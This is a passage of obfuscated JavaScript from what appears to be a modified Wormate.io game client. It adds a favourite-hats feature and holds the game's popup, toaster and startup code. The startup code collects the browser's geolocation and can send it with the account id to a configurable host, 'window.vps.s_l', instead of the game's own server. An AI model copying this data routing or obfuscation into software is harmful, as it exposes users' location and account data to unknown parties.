                _0x1673f9.push(_0x4ad76e);
              }
            }
            return _0x1673f9;
          } catch (_0x334364) {
            console.log("Error getting available hats:", _0x334364);
            return [];
          }
        }
        function _0x5b8268() {
          try {
            const _0x8bfb97 = _0xe610a0();
            if (_0x8bfb97 && _0x8bfb97.Mh && _0x8bfb97.Mh.Lh && _0x8bfb97.Mh.Lh.ki) {
              return {
                currentHatId: _0x8bfb97.Mh.Lh.ki.Yi,
                isInFavorites: vps.selectedHats ? vps.selectedHats.includes(_0x8bfb97.Mh.Lh.ki.Yi) : false
              };
            }
          } catch (_0x446e63) {
            console.log("Error getting current hat info:", _0x446e63);
          }
          return {
            currentHatId: null,
            isInFavorites: false
          };
        }
        function _0x51c226(_0x374b23, _0x17a0ed = "info") {
          $("#hat-notification").remove();
          var _0x1b4ece = _0x17a0ed === "success" ? "rgba(76, 175, 80, 0.9)" : _0x17a0ed === "error" ? "rgba(244, 67, 54, 0.9)" : "rgba(33, 150, 243, 0.9)";
          var _0x200906 = $("<div id='hat-notification'>").css({
            position: "fixed",
            top: "20px",
            right: "20px",
            background: _0x1b4ece,
            color: "white",
            padding: "12px 16px",
            "border-radius": "6px",
            "z-index": "999999",
            "font-size": "14px",
            "box-shadow": "0 4px 12px rgba(0,0,0,0.3)",
            "max-width": "300px",
            "word-wrap": "break-word"
          }).html("🎩 " + _0x374b23);
          $("body").append(_0x200906);
          setTimeout(function () {
            _0x200906.fadeOut(500, function () {
              $(this).remove();
            });
          }, 3000);
        }
        window.HatFavoritesAPI = {
          addHat: function (_0xcb1a28) {
            if (!vps.selectedHats) {
              vps.selectedHats = [];
            }
            if (!vps.selectedHats.includes(_0xcb1a28)) {
              vps.selectedHats.push(_0xcb1a28);
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x51c226("Hat #" + _0xcb1a28 + " added to favorites!", "success");
              return true;
            } else {
              _0x51c226("Hat #" + _0xcb1a28 + " is already in favorites!", "info");
              return false;
            }
          },
          removeHat: function (_0x4e76f8) {
            if (!vps.selectedHats) {
              return false;
            }
            var _0x555a43 = vps.selectedHats.indexOf(_0x4e76f8);
            if (_0x555a43 > -1) {
              vps.selectedHats.splice(_0x555a43, 1);
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x51c226("Hat #" + _0x4e76f8 + " removed from favorites!", "success");
              return true;
            } else {
              _0x51c226("Hat #" + _0x4e76f8 + " not found in favorites!", "error");
              return false;
            }
          },
          getFavorites: function () {
            return vps.selectedHats || [];
          },
          cycle: function () {
            _0x2c96cf();
          },
          clearAll: function () {
            if (confirm("Are you sure you want to remove all favorite hats?")) {
              vps.selectedHats = [];
              localStorage.setItem("SaveGameup", JSON.stringify(vps));
              localStorage.setItem("SaveGamewup", JSON.stringify(vps));
              _0x51c226("All favorite hats cleared!", "success");
              return true;
            }
            return false;
          },
          openDialog: function () {
            if (typeof _0xdfa2b !== "undefined") {
              var _0x461a2b = new _0xdfa2b();
              if (_0x461a2b.showFavoritesDialog) {
                _0x461a2b.showFavoritesDialog();
              }
            }
          },
          getCurrentHat: function () {
            return _0x5b8268();
          },
          getAvailableHats: function () {
            return _0x1e21ae();
          },
          addCurrentHat: function () {
            var _0x5f0fc7 = _0x5b8268();
            if (_0x5f0fc7.currentHatId) {
              return this.addHat(_0x5f0fc7.currentHatId);
            } else {
              _0x51c226("No hat currently selected!", "error");
              return false;
            }
          },
          isInFavorites: function (_0x1e1466) {
            if (vps.selectedHats) {
              return vps.selectedHats.includes(_0x1e1466);
            } else {
              return false;
            }
          },
          applyHat: function (_0x4df79f) {
            var _0x9dfea8 = _0x25a3f2(_0x4df79f);
            if (_0x9dfea8) {
              _0x51c226("Hat #" + _0x4df79f + " applied!", "success");
            } else {
              _0x51c226("Failed to apply hat #" + _0x4df79f, "error");
            }
            return _0x9dfea8;
          }
        };
        window.addEventListener("error", function (_0x42c921) {
          if (_0x42c921.message && _0x42c921.message.toLowerCase().includes("hat")) {
            console.warn("🚨 Hat System Error:", _0x42c921.message);
          }
        });
        function _0x3c9e50() {
          var _0x3b1ca2 = {
            vpsExists: typeof vps !== "undefined",
            selectedHatsExists: vps && Array.isArray(vps.selectedHats),
            favoritesCount: vps && vps.selectedHats ? vps.selectedHats.length : 0,
            cacheSize: window.globalHatTextureCache ? Object.keys(window.globalHatTextureCache).length : 0,
            keyboardInitialized: window.hatCyclingInitialized || false
          };
          return _0x3b1ca2;
        }
        window.checkHatSystemHealth = _0x3c9e50;
        window.showHatNotification = _0x51c226;
        setTimeout(function () {
          _0x3c9e50();
        }, 3000);
        var _0x2918d9 = function () {
          function _0x2153f5(_0x4ea330, _0x4ed52a, _0x50563) {
            this.Yo = _0x4ea330;
            this.nd = _0x4ed52a;
            this.Ao = _0x50563;
            this.ac = {};
            this.mp = [[]];
            this.np = -10;
            this.op = -10;
          }
          _0x2153f5.prototype.ip = function (_0x45b484) {
            this.mp = _0x45b484;
          };
          _0x2153f5.prototype.jp = function (_0x1c8b68) {
            this.ac = _0x1c8b68;
          };
          _0x2153f5.prototype.Gk = function () {
            var _0x69b249 = _0xe610a0();
            var _0x220062 = _0x69b249.On.rj(this.nd);
            for (var _0x553f17 = 0; _0x553f17 < this.mp.length; _0x553f17++) {
              for (var _0x5273cf = 0; _0x5273cf < this.mp[_0x553f17].length; _0x5273cf++) {
                if (this.mp[_0x553f17][_0x5273cf] == _0x220062) {
                  this.pp(_0x553f17);
                  this.qp(_0x5273cf);
                  return;
                }
              }
            }
            this.pp(0);
            this.qp(0);
          };
          _0x2153f5.prototype.fp = function () {
            var _0x1fe158 = this.np - 1;
            if (_0x1fe158 < 0) {
              _0x1fe158 = this.mp.length - 1;
            }
            this.pp(_0x1fe158);
            this.qp(this.op % this.mp[_0x1fe158].length);
          };
          _0x2153f5.prototype.gp = function () {
            var _0x218a6d = this.np + 1;
            if (_0x218a6d >= this.mp.length) {
              _0x218a6d = 0;
            }
            this.pp(_0x218a6d);
            this.qp(this.op % this.mp[_0x218a6d].length);
          };
          _0x2153f5.prototype.pp = function (_0x59e74e) {
            var _0x254496 = this;
            if (!(_0x59e74e < 0) && !(_0x59e74e >= this.mp.length)) {
              this.np = _0x59e74e;
              _0x34168a.empty();
              var _0x7e2f4e = this.mp[this.np];
              if (_0x7e2f4e.length > 1) {
                for (var _0x4722b5 = 0; _0x4722b5 < _0x7e2f4e.length; _0x4722b5++) {
                  (function (_0x2d1796) {
                    var _0x45e983 = _0x7e2f4e[_0x2d1796];
                    var _0x4f0d2d = _0x254496.ac[_0x45e983];
                    var _0x102fd6 = "#" + _0x254496.Yo.dp[_0x4f0d2d.prime];
                    var _0x1b68f3 = $("<div style=\"border-color:" + _0x102fd6 + "\"></div>");
                    _0x1b68f3.click(function () {
                      _0xe610a0().Ci.Be();
                      _0x254496.qp(_0x2d1796);
                    });
                    _0x34168a.append(_0x1b68f3);
                  })(_0x4722b5);
                }
              }
            }
          };
          _0x2153f5.prototype.qp = function (_0x5385af) {
            if (!(_0x5385af < 0) && !(_0x5385af >= this.mp[this.np].length)) {
              this.op = _0x5385af;
              _0x34168a.children().css("background-color", "transparent");
              var _0x352598 = _0x34168a.children(":nth-child(" + (1 + _0x5385af) + ")");
              _0x352598.css("background-color", _0x352598.css("border-color"));
              this.Yo.Po(true);
            }
          };
          _0x2153f5.prototype.Wo = function () {
            return this.mp[this.np][this.op];
          };
          return _0x2153f5;
        }();
        return _0xdfa2b;
      }();
      _0x31b4a1.Yj = function () {
        var _0x3443b8 = $("#withdraw-consent-yes");
        var _0x2a5945 = $("#withdraw-consent-no");
        var _0x2b769e = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.consent.tab"), false);
          var _0x24242c = _0xe610a0();
          _0x3443b8.click(function () {
            _0x24242c.Ci.Be();
            if (_0x24242c.Go()) {
              _0x24242c.og.Ak(_0x24242c.og._e);
              _0x24242c.rp(false, true);
              _0x24242c.og.qk._n(new _0x31b4a1.sp());
            } else {
              _0x24242c.og.Dk();
            }
          });
          _0x2a5945.click(function () {
            _0x24242c.Ci.Be();
            _0x24242c.og.Dk();
          });
        });
        _0x2b769e.prototype.ha = function () {
          _0x2b769e.parent.prototype.ha.call(this);
        };
        _0x2b769e.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeIn(200);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeOut(50);
        };
        _0x2b769e.prototype.Hk = function () {
          _0xe610a0().Ci.Ce();
        };
        return _0x2b769e;
      }();
      _0x31b4a1.$j = function () {
        var _0x32b67e = $("#delete-account-timer");
        var _0x48b750 = $("#delete-account-yes");
        var _0x3c4fd8 = $("#delete-account-no");
        var _0x6a0d08 = _0x2c22d1.M(_0x31b4a1.bo, function () {
          _0x31b4a1.bo.call(this, _0x2c22d1.H("index.game.popup.menu.delete.tab"), false);
          var _0x182028 = _0xe610a0();
          _0x48b750.click(function () {
            _0x182028.Ci.Be();
            if (_0x182028.Ij.Hj()) {
              _0x182028.Ij.Sl();
              _0x182028.Ij.Kl();
            } else {
              _0x182028.og.Dk();
            }
          });
          _0x3c4fd8.click(function () {
            _0x182028.Ci.Be();
            _0x182028.og.Dk();
          });
          this.tp = [];
        });
        _0x6a0d08.prototype.ha = function () {
          _0x6a0d08.parent.prototype.ha.call(this);
        };
        _0x6a0d08.prototype.qo = function () {
          _0x31b4a1.bo.go.stop();
          _0x31b4a1.bo.go.fadeOut(50);
          _0x31b4a1.bo.ho.stop();
          _0x31b4a1.bo.ho.fadeOut(50);
          _0x31b4a1.bo.io.stop();
          _0x31b4a1.bo.io.fadeOut(50);
          _0x31b4a1.bo.ko.stop();
          _0x31b4a1.bo.ko.fadeOut(50);
          _0x31b4a1.bo.jo.stop();
          _0x31b4a1.bo.jo.fadeOut(50);
          _0x31b4a1.bo.lo.stop();
          _0x31b4a1.bo.lo.fadeOut(50);
          _0x31b4a1.bo.mo.stop();
          _0x31b4a1.bo.mo.fadeOut(50);
          _0x31b4a1.bo.no.stop();
          _0x31b4a1.bo.no.fadeOut(50);
          _0x31b4a1.bo.oo.stop();
          _0x31b4a1.bo.oo.fadeOut(50);
          _0x31b4a1.bo.po.stop();
          _0x31b4a1.bo.po.fadeIn(200);
        };
        _0x6a0d08.prototype.Hk = function () {
          _0xe610a0().Ci.Ge();
          _0x48b750.stop();
          _0x48b750.hide();
          _0x32b67e.stop();
          _0x32b67e.show();
          _0x32b67e.text(".. 10 ..");
          this.up();
          this.vp(function () {
            _0x32b67e.text(".. 9 ..");
          }, 1000);
          this.vp(function () {
            _0x32b67e.text(".. 8 ..");
          }, 2000);
          this.vp(function () {
            _0x32b67e.text(".. 7 ..");
          }, 3000);
          this.vp(function () {
            _0x32b67e.text(".. 6 ..");
          }, 4000);
          this.vp(function () {
            _0x32b67e.text(".. 5 ..");
          }, 5000);
          this.vp(function () {
            _0x32b67e.text(".. 4 ..");
          }, 6000);
          this.vp(function () {
            _0x32b67e.text(".. 3 ..");
          }, 7000);
          this.vp(function () {
            _0x32b67e.text(".. 2 ..");
          }, 8000);
          this.vp(function () {
            _0x32b67e.text(".. 1 ..");
          }, 9000);
          this.vp(function () {
            _0x32b67e.hide();
            _0x48b750.fadeIn(300);
          }, 10000);
        };
        _0x6a0d08.prototype.vp = function (_0x25d16a, _0x50e035) {
          var _0x2260f9 = setTimeout(_0x25d16a, _0x50e035);
          this.tp.push(_0x2260f9);
        };
        _0x6a0d08.prototype.up = function () {
          for (var _0x1b8885 = 0; _0x1b8885 < this.tp.length; _0x1b8885++) {
            clearTimeout(this.tp[_0x1b8885]);
          }
          this.tp = [];
        };
        return _0x6a0d08;
      }();
      _0x31b4a1.wp = function () {
        function _0x50571a() {
          this.ao = function () {};
        }
        _0x50571a.prototype.tf = function () {};
        _0x50571a.prototype.Hk = function () {};
        return _0x50571a;
      }();
      _0x31b4a1.Gl = function () {
        var _0x24b8e5 = _0x2c22d1.M(_0x31b4a1.wp, function (_0x590f6a) {
          _0x31b4a1.wp.call(this);
          var _0x17a249 = Date.now() + "_" + Math.floor(1000 + Math.random() * 8999);
          this.xp = $("<div id=\"" + _0x17a249 + "\" class=\"toaster toaster-coins\">    <img class=\"toaster-coins-img\" alt=\"Wormate Coin\" src=\"/images/coin_320.png\" />    <div class=\"toaster-coins-val\">+" + _0x590f6a + "</div>    <div class=\"toaster-coins-close\">" + _0x2c22d1.H("index.game.toaster.continue") + "</div></div>");
          var _0x5751d2 = this;
          this.xp.find(".toaster-coins-close").click(function () {
            _0xe610a0().Ci.Be();
            _0x5751d2.ao();
          });
        });
        _0x24b8e5.prototype.tf = function () {
          return this.xp;
        };
        _0x24b8e5.prototype.Hk = function () {
          _0xe610a0().Ci.Ee();
        };
        return _0x24b8e5;
      }();
      _0x31b4a1.Fl = function () {
        var _0x51f3cc = _0x2c22d1.M(_0x31b4a1.wp, function (_0x323320) {
          _0x31b4a1.wp.call(this);
          var _0x10e314 = Date.now() + "_" + Math.floor(1000 + Math.random() * 8999);
          this.xp = $("<div id=\"" + _0x10e314 + "\" class=\"toaster toaster-levelup\">    <img class=\"toaster-levelup-img\" alt=\"Wormate Level Up Star\" src=\"/images/level-star.svg\" />    <div class=\"toaster-levelup-val\">" + _0x323320 + "</div>    <div class=\"toaster-levelup-text\">" + _0x2c22d1.H("index.game.toaster.levelup") + "</div>    <div class=\"toaster-levelup-close\">" + _0x2c22d1.H("index.game.toaster.continue") + "</div></div>");
          var _0x37006e = this;
          this.xp.find(".toaster-levelup-close").click(function () {
            _0xe610a0().Ci.Be();
            _0x37006e.ao();
          });
        });
        _0x51f3cc.prototype.tf = function () {
          return this.xp;
        };
        _0x51f3cc.prototype.Hk = function () {
          _0xe610a0().Ci.De();
        };
        return _0x51f3cc;
      }();
      _0x31b4a1.sp = function () {
        var _0x1c66ae = _0x2c22d1.M(_0x31b4a1.wp, function () {
          _0x31b4a1.wp.call(this);
          var _0x527c56 = this;
          var _0x25fe85 = _0xe610a0();
          var _0x90b8ef = Date.now() + "_" + Math.floor(1000 + Math.random() * 8999);
          this.xp = $("<div id=\"" + _0x90b8ef + "\" class=\"toaster toaster-consent-accepted\">    <img class=\"toaster-consent-accepted-logo\" src=\"" + _0x2c22d1.a.d + "\" alt=\"Wormate.io logo\"/>    <div class=\"toaster-consent-accepted-container\">        <span class=\"toaster-consent-accepted-text\">" + _0x2c22d1.H("index.game.toaster.consent.text").replaceAll(" ", "&nbsp;").replaceAll("\n", "<br/>") + "</span>        <a class=\"toaster-consent-accepted-link\" href=\"/privacy-policy\">" + _0x2c22d1.H("index.game.toaster.consent.link") + "</a>    </div>    <div class=\"toaster-consent-close\">" + _0x2c22d1.H("index.game.toaster.consent.iAccept") + "</div></div>");
          this.yp = this.xp.find(".toaster-consent-close");
          this.yp.hide();
          this.yp.click(function () {
            _0x25fe85.Ci.Be();
            if (_0x25fe85.Go()) {
              _0x25fe85.rp(true, true);
            }
            _0x527c56.ao();
          });
        });
        _0x1c66ae.prototype.tf = function () {
          return this.xp;
        };
        _0x1c66ae.prototype.Hk = function () {
          var _0x3e0e0e = this;
          var _0x20472d = _0xe610a0();
          if (_0x20472d.Go() && !_0x20472d.hl()) {
            _0x20472d.Ci.Ge();
            setTimeout(function () {
              _0x3e0e0e.yp.fadeIn(300);
            }, 2000);
          } else {
            setTimeout(function () {
              _0x3e0e0e.ao();
            }, 0);
          }
        };
        return _0x1c66ae;
      }();
      _0x31b4a1.uk = function () {
        var _0x39f8e0 = $("#error-gateway-connection-retry");
        var _0x142eef = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
          var _0x911ef2 = _0xe610a0();
          _0x39f8e0.click(function () {
            _0x911ef2.Ci.Be();
            _0x911ef2.og.ie.Mn();
            _0x911ef2.og.Ak(_0x911ef2.og.ie);
            setTimeout(function () {
              var _0x17fdb2 = _0x2c22d1.a.b + "/pub/healthCheck/ping";
              _0x2c22d1.Z(_0x17fdb2, function () {
                _0x911ef2.og.Ak(_0x911ef2.og.tk);
              }, function (_0x2c8c57) {
                _0x911ef2.og.ie.Kn();
                _0x911ef2.Lc.Ib(function () {
                  _0x911ef2.og.Ak(_0x911ef2.og._e);
                }, function (_0x35b525) {
                  _0x911ef2.og.Ak(_0x911ef2.og.tk);
                }, function (_0x51a2d3, _0x345f94) {
                  var _0x151832 = _0x51a2d3;
                  _0x911ef2.og.ie.Ln(_0x151832, _0x345f94);
                });
              });
            }, 2000);
          });
        });
        _0x142eef.prototype.ha = function () {};
        _0x142eef.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(50);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(50);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(50);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(50);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeIn(500);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeOut(50);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeOut(50);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeOut(50);
        };
        _0x142eef.prototype.Hk = function () {
          var _0x13000b = _0xe610a0();
          _0x13000b.Ci.pe(_0x31b4a1.ge.je._e);
          _0x13000b.Ci.Ge();
        };
        return _0x142eef;
      }();
      _0x31b4a1.wk = function () {
        var _0x406c44 = $("#error-game-connection-retry");
        var _0x628e1f = _0x2c22d1.M(_0x31b4a1.kf, function () {
          _0x31b4a1.kf.call(this, _0x31b4a1.Fk.wn);
          var _0x14eeb8 = _0xe610a0();
          _0x406c44.click(function () {
            _0x14eeb8.Ci.Be();
            _0x14eeb8.og.Ak(_0x14eeb8.og._e);
          });
        });
        _0x628e1f.prototype.ha = function () {};
        _0x628e1f.prototype.Gk = function () {
          _0x31b4a1.kf.jn.stop();
          _0x31b4a1.kf.jn.fadeOut(50);
          _0x31b4a1.kf.ln.stop();
          _0x31b4a1.kf.ln.fadeOut(50);
          _0x31b4a1.kf.nn.stop();
          _0x31b4a1.kf.nn.fadeOut(50);
          _0x31b4a1.kf.pn.stop();
          _0x31b4a1.kf.pn.fadeOut(50);
          _0x31b4a1.kf.sn.stop();
          _0x31b4a1.kf.sn.fadeOut(50);
          _0x31b4a1.kf.qn.stop();
          _0x31b4a1.kf.qn.fadeOut(50);
          _0x31b4a1.kf.rn.stop();
          _0x31b4a1.kf.rn.fadeOut(50);
          _0x31b4a1.kf.tn.stop();
          _0x31b4a1.kf.tn.fadeOut(50);
          _0x31b4a1.kf.un_error.stop();
          _0x31b4a1.kf.un_error.fadeIn(500);
          _0x31b4a1.kf.mn.stop();
          _0x31b4a1.kf.mn.fadeIn(1);
          _0x31b4a1.kf.bgcanvas.stop();
          _0x31b4a1.kf.bgcanvas.fadeIn(500);
          _0x31b4a1.GameView.Kf(true);
          _0x31b4a1.kf.socialButtons.stop();
          _0x31b4a1.kf.socialButtons.fadeOut(50);
          _0x31b4a1.kf.vn.stop();
          _0x31b4a1.kf.vn.fadeOut(50);
        };
        _0x628e1f.prototype.Hk = function () {
          var _0xb67d10 = _0xe610a0();
          _0xb67d10.Ci.pe(_0x31b4a1.ge.je._e);
          _0xb67d10.Ci.Ge();
        };
        return _0x628e1f;
      }();
      _0x2c22d1.zp = function () {
        function _0x120a0c(_0x20b620) {
          var _0x663fd2 = _0x20b620 + Math.floor(Math.random() * 65535) * 37;
          _0x31b4a1.Vf.eg(_0x31b4a1.Vf.cg, _0x663fd2, 30);
        }
        function _0x5a9b16() {
          return parseInt(_0x31b4a1.Vf.fg(_0x31b4a1.Vf.cg)) % 37;
        }
        return function () {
          var _0x4c19bb = _0x5a9b16();
          if (!(_0x4c19bb >= 0) || !(_0x4c19bb < _0x13de32.Ap)) {
            _0x4c19bb = Math.max(0, _0x13de32.Ap - 2);
          }
          var _0x4bacfe = {
            zn: _0x13de32,
            Bp: false
          };
          _0x4bacfe.Cp = Date.now();
          _0x4bacfe.Dp = 0;
          _0x4bacfe.Ep = 0;
          _0x4bacfe.Fp = null;
          _0x4bacfe.Gp = _0x2c22d1.a.j;
          _0x4bacfe.Hp = _0x2c22d1.a.i;
          _0x4bacfe.dh = null;
          _0x4bacfe.Lc = null;
          _0x4bacfe.xe = null;
          _0x4bacfe.Ci = null;
          _0x4bacfe.og = null;
          _0x4bacfe.On = null;
          _0x4bacfe.Ij = null;
          try {
            if (navigator && navigator.geolocation) {
              navigator.geolocation.getCurrentPosition(function (_0x2d18a9) {
                if (_0x2d18a9.coords !== undefined) {
                  var _0x397e6a = _0x2d18a9.coords;
                  if (_0x397e6a.latitude !== undefined && _0x397e6a.longitude !== undefined) {
                    _0x4bacfe.Fp = _0x2d18a9;
                  }
                }
              }, function (_0x154d04) {});
            }
          } catch (_0x39e474) {}
          _0x4bacfe.Ip = function () {
            _0x4bacfe.dh = new _0x31b4a1.Engine();
            _0x4bacfe.dh.Kp = new _0x31b4a1.MessageProcessor(_0x4bacfe.dh);
            _0x4bacfe.Lc = new _0x31b4a1._a();
            _0x4bacfe.xe = new _0x31b4a1.Qj();
            _0x4bacfe.Ci = new _0x31b4a1.ge();
            _0x4bacfe.og = new _0x31b4a1.Tj();
            _0x4bacfe.On = new _0x31b4a1.kj();
            _0x4bacfe.Ij = new _0x31b4a1.Mk();
            _0x4bacfe.ha();
          };
          _0x4bacfe.ha = function () {
            try {
              ga("send", "event", "app", window.runtimeHash + "_init");
            } catch (_0x1e3b05) {}
            _0x4bacfe.dh.Lp = function () {
              _0x4bacfe.og.Ak(_0x4bacfe.og.vk);
            };
            _0x4bacfe.dh.Mp = function () {
              var _0x40bafc = _0x4bacfe.og._e.Wn();
              try {
                ga("send", "event", "game", window.runtimeHash + "_start", _0x40bafc);
              } catch (_0x2dfef1) {}
              _0x4bacfe.Ci.pe(_0x31b4a1.ge.je.af);
              _0x4bacfe.og.Ak(_0x4bacfe.og.af.Dn());
            };
            _0x4bacfe.dh.Np = function () {
              try {
                ga("send", "event", "game", window.runtimeHash + "_end");
              } catch (_0x4358ae) {}
              if ($("body").height() >= 430) {
                _0x4bacfe.zn.Op.ka();
              }
              _0x4bacfe.Lc.Ib(null, null, null);
              (function () {
                var _0x2bd873 = Math.floor(_0x4bacfe.dh.ch.Bh);
                var _0x357849 = _0x4bacfe.dh.Ih;
                if (_0x4bacfe.Ij.Hj()) {
                  _0x4bacfe.Ij.Bl(function () {
                    _0x4bacfe.Pp(_0x2bd873, _0x357849);
                  });
                } else {
                  _0x4bacfe.Pp(_0x2bd873, _0x357849);
                }
              })();
            };
            _0x4bacfe.dh.Qp = function (_0x5d2655) {
              _0x5d2655(_0x4bacfe.og.af.Gn(), _0x4bacfe.og.af.Hn());
            };
            _0x4bacfe.Ij.yl(function () {
              var _0xa552ab = _0x4bacfe.og.Lk();
              if (_0xa552ab != null && _0xa552ab.nd === _0x31b4a1.Fk.Ek) {
                _0x4bacfe.Ci.pe(_0x31b4a1.ge.je._e);
                _0x4bacfe.og.Ak(_0x4bacfe.og._e);
              }
              if (_0x4bacfe.Ij.Hj()) {
                try {
                  var _0x3aaeac = _0x4bacfe.Ij.cl();
                  ga("set", "userId", _0x3aaeac);
                } catch (_0xc1d3b) {}
              }
              if (_0x4bacfe.Go() && _0x4bacfe.Ij.Hj() && !_0x4bacfe.Ij.hl()) {
                _0x4bacfe.rp(false, false);
                _0x4bacfe.og.qk._n(new _0x31b4a1.sp());
              } else {
                _0x4bacfe.Rp(true);
              }
            });
            _0x4bacfe.dh.run();
            _0x4bacfe.og.ha();
            _0x4bacfe.On.ha();
            _0x4bacfe.Lc.ha();
            _0x4bacfe.og._e.Vn();
            _0x4bacfe.og.Ak(_0x4bacfe.og._e);
            _0x4bacfe.xe.ha(function () {
              _0x4bacfe.Ci.ha();
              _0x4bacfe.Ij.ha();
              _0x4bacfe.Lc.Ib(function () {
                _0x4bacfe.og._e.Un();
                _0x4bacfe.og.Ak(_0x4bacfe.og._e);
              }, function (_0x2b3c07) {
                _0x4bacfe.og._e.Un();
                _0x4bacfe.og.Ak(_0x4bacfe.og.tk);
              }, function (_0x1bac36, _0x4f84ad) {
                var _0x301f0c = _0x1bac36;
                _0x4bacfe.og.ie.Ln(_0x301f0c, _0x4f84ad);
                _0x4bacfe.og._e.Ln(_0x301f0c, _0x4f84ad);
              });
              if (_0x4bacfe.Go() && !_0x4bacfe.hl()) {
                _0x4bacfe.og.qk._n(new _0x31b4a1.sp());
              } else {
                _0x4bacfe.Rp(true);
              }
            });
          };
          _0x4bacfe.Sp = function (_0x2480e4) {
            if (_0x4bacfe.Ij.Hj()) {
              var _0x4c4736 = _0x4bacfe.Ij.Al();
              var _0x27a3e9 = _0x2c22d1.a.b + "/pub/wuid/" + _0x4c4736 + "/consent/change?value=" + encodeURI(_0x2480e4);
              _0x2c22d1.Z(_0x27a3e9, function () {}, function (_0x5f2cec) {});
            }
          };
          _0x4bacfe.Pn = function (_0x21fdf9) {
            _0x4c19bb++;
            if (!_0x4bacfe.zn.Tp && _0x4c19bb >= _0x4bacfe.zn.Ap) {
              _0x4bacfe.og.Ak(_0x4bacfe.og.xk);
              _0x4bacfe.Ci.pe(_0x31b4a1.ge.je.cf);
              _0x4bacfe.zn.Up.ia();
            } else {
              _0x120a0c(_0x4c19bb);
              _0x4bacfe.Vp(_0x21fdf9);
            }
          };
          _0x4bacfe.Vp = function (_0x31e1f4) {
            if (_0x4bacfe.dh.Wp()) {
              _0x4bacfe.og.ie.Mn();
              _0x4bacfe.og.Ak(_0x4bacfe.og.ie);
              var _0x156e61 = _0x4bacfe.og._e.Wn();
              _0x31b4a1.Vf.eg(_0x31b4a1.Vf._f, _0x156e61, 30);
              var _0x2c72a8 = _0x4bacfe.og.$h.Zh();
              _0x31b4a1.Vf.eg(_0x31b4a1.Vf.Xf, _0x2c72a8, 30);
              var _0x3f0d9b = 0;
              if (_0x4bacfe.Fp != null) {
                var _0xd23811 = _0x4bacfe.Fp.coords.latitude;
                var _0x400954 = _0x4bacfe.Fp.coords.longitude;
                _0x3f0d9b = Math.max(0, Math.min(32767, (_0xd23811 + 90) / 180 * 32768)) << 1 | 1 | Math.max(0, Math.min(65535, (_0x400954 + 180) / 360 * 65536)) << 16;
              }
              if (_0x4bacfe.Ij.Hj()) {
                _0x4bacfe.Xp(_0x156e61, _0x3f0d9b, _0x31e1f4);
              } else {
                var _0x2914a3 = _0x4bacfe.og._e.el();
                _0x31b4a1.Vf.eg(_0x31b4a1.Vf.ag, _0x2914a3, 30);
                var _0x235e4c = _0x4bacfe.On.rj(_0x31b4a1.tj.sj);
                _0x31b4a1.Vf.eg(_0x31b4a1.Vf.bg, _0x235e4c, 30);
                _0x4bacfe.Yp(_0x156e61, _0x3f0d9b);
              }
            }
          };
          _0x4bacfe.Xp = function (_0x5eecdc, _0x113f55, _0x642d28) {
            var _0x815050 = _0x4bacfe;
            var _0x58c38c = _0x4bacfe.Ij.Al();
            var _0x58cd51 = _0x4bacfe.og._e.el();
            var _0x19906a = _0x4bacfe.On.rj(_0x31b4a1.tj.sj);
            var _0x21f0b5 = _0x4bacfe.On.rj(_0x31b4a1.tj.uj);
            var _0x3668c1 = _0x4bacfe.On.rj(_0x31b4a1.tj.vj);
            var _0x46a68f = _0x4bacfe.On.rj(_0x31b4a1.tj.xj);
            var _0x43d903 = _0x4bacfe.On.rj(_0x31b4a1.tj.wj);
            var _0x3e0a0e = (_0x5b6103 ? window.vps.s_l : _0x2c22d1.a.b) + "/pub/wuid/" + _0x58c38c + "/start?gameMode=" + encodeURI(_0x5eecdc) + "&gh=" + _0x113f55 + "&nickname=" + _0x4d2813(_0x261341.Xp(_0x58c38c, _0x58cd51, _0x19906a, _0x21f0b5, _0x3668c1, _0x46a68f, _0x43d903), true) + "&skinId=" + window.vps.a + "&eyesId=" + window.vps.b + "&mouthId=" + window.vps.c + "&glassesId=" + window.vps.d + "&hatId=" + window.vps.e;
            _0x2c22d1.Z(_0x3e0a0e, function () {
              _0x815050.og.Ak(_0x815050.og.tk);
            }, function (_0x4dee43) {
              if (_0x4dee43.code === 1460) {
